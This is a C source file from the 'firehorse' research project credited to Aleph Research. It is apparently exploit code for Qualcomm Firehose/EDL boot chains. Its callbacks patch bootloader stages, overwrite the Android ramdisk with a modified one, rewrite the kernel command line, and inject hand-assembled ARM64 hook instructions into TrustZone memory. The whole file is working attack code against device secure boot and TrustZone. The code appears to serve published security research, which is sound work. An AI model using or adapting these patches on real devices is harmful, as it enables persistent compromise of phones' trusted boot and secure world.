/*
firehorse
by Roee Hay & Noam Hadad, Aleph Research
*/

#include "../../fh.h"

STACKHOOK(fhpatcher)
{
    DD("Firehose patcher called!");
    
    init();

    DD("Firehose patcher done!");
}


STACKHOOK(pblpatcher)
{
    DD("PBL patcher called!");
    
    fh_dacr();
    pagecopy();
    pageremap();
    init();

    DD("PBL patcher called done!");
}


/*
 * Called after the sbl is loaded to memory and before it is executed.
 * Updates relevant sbl function pointers (so we can use them later...)
 */
void cb_sblpatcher(cbargs *args)
{
    int *ptr = (int *)0x804CE67;
    *ptr = 0x6f6f66;
   
    set_uartB(ADDR_UARTB_SBL);
    set_snprintf(ADDR_SNPRINTF_SBL);

    init();
}


/*
 * Called after the abl is loaded to memory and before it is executed.
 * Updates all relevant abl function pointers (so we can use them later...)
 * Moves FireHorse to a new location (where it won't get overwritten)
 */
void cb_ablpatcher(cbargs *args)
{
    char foowelcome[] = "welcome to foo\n";
    char fmt[] = "FOOBAR %08x\n";
    char oem[] = "oem foo";

    char *ptr = (char *)0x8f675140;

    memcpy((void *)0x8f66c6c0, fmt, sizeof(fmt));
    memcpy(ptr, foowelcome, sizeof(foowelcome));
    memcpy((void *)0x8F67A9FC, oem, sizeof(oem));

    DD("FOOBAR");
    //fh_dump_log();
 
    fh_disable_uart();
    set_dprintf(ADDR_DPRINT_ABOOT);
    set_partition_get_index(ADDR_PARTITION_GET_INDEX);
    set_partition_get_offset(ADDR_PARTITION_GET_OFFSET);
    set_partition_get_lun(ADDR_PARTITION_GET_LUN);
    set_mmc_set_lun(ADDR_MMC_SET_LUN );
    set_mmc_read(ADDR_MMC_READ);
    set_mmc_get_device_blocksize(ADDR_MMC_GET_DEVICE_BLOCKSIZE);
    set_get_scratch_address(ADDR_GET_SCRATCH_ADDRESS);

    fh_rebase(ADDR_FH_ABOOT_REBASE);
    set_uartB(ADDR_UARTB_SBL);
    set_snprintf(ADDR_SNPRINTF_SBL);
    
}


/*
 * A small patch to one of the strings in the linnux kernel
 */
void patch_kernel()
{
    char foo[]=  "hello from linux!!! foo";  
    memcpy((void *)(0x10080000+0xEE8D10), foo, sizeof(foo));
}


/*
 * Overwrites the ramdisk with our moded ramdisk 
 */
void cb_before_linux()
{
    patch_kernel();
    memcpy(ADDR_RAMDISK, ADDR_SCRATCH_RAMDISK, RAMDISK_SIZE);

    //make sure the tz hook was executed
    DD("TZ hook write address was 0x8F91FFF8, dumping memory @0x8F91FFF0:");
    fh_memdump(0x8F91FFF0, 0x10);
    
}


/*
 * Reads the logdump partition to ADDR_SCRATCH_RAMDISK
 */
void cb_mmcread()
{
 
    int logdump = partition_get_index("logdump");
    unsigned long long logdumpoffset = partition_get_offset(logdump);
    int logdumplun = partition_get_lun(logdumpoffset);
    u_int32 scratch = get_scratch_address();

    mmc_set_lun(logdumplun);
    int blocksize = mmc_get_device_blocksize();
        
    u_int32 ramdisksize = RAMDISK_SIZE + (blocksize - mod(RAMDISK_SIZE, blocksize));

    mmc_read(logdumpoffset, ADDR_SCRATCH_RAMDISK, ramdisksize);

}

/*
 * Called right before the linux kernel is jumped to
 * patches the ramdisk size and kernel command line passed to the DTB consruction routine
 */
void cb_bootlinux(cbargs *cb)
{
    char *cmdline = (char *)(cb->regs[R7]);
    char buf[]= "console=ttyHSL0,115200,n8 androidboot.console=ttyHSL0 \
                androidboot.hardware=qcom msm_rtb.filter=0x237 ehci-hcd.park=3 \
                lpm_levels.sleep_disabled=1 androidboot.bootdevice=7824900.sdhci \
                loglevel=7 buildvariant=user";

    D("Setting ramdisk size to %d", RAMDISK_SIZE);
    cb->regs[R5] = RAMDISK_SIZE;

    D("Printing cmdline from %08x", cmdline);
    D("cmdline = %s", cmdline);
    
    memcpy(cmdline, buf, sizeof(buf));
}


/*
 * This callback is called right before QSEE start,
 * it patches the TZ with a hook on the first function call after the entry point
 */
void cb_patchtz(cbargs *cb)
{
    //patch the function call at 0x86500008 with a call to our code (located at 0x86503B90) 
    u_int32 *call_addr = (u_int32*)0x86500008;
    *call_addr = 0x94000EE2;                        // BL 0x86503B90

    
    u_int32 *payload_addr = (u_int32*)0x86503B90;   // write payload at 0x86503B90
    u_int64 *constants_addr;

    //write the address in the address 
    *(payload_addr++) = 0x580000C0;                 // LDR X0, 0x18 -> loads the value in (**) to X0
    *(payload_addr++) = 0xF9000000;                 // STR X0, [X0]
 
    //return to hooked code
    *(payload_addr++) = 0x58000040;                 // LDR x0, 0x8 -> loads the value in (*)
    *(payload_addr++) = 0xD61F0000;                 // BR X0

    // constants
    constants_addr = (u_int64*)payload_addr;
    *(constants_addr++) = 0x86501340;               // (*) return value for x0
    *(constants_addr++) = 0x8F91FFF8;               // (**) first value for x0


    DD("tz @0x86503B90:");
    fh_memdump(0x86503B90, 0x20);
    DD("tz @0x86500008:");
    fh_memdump(0x86500008, 0x10);
}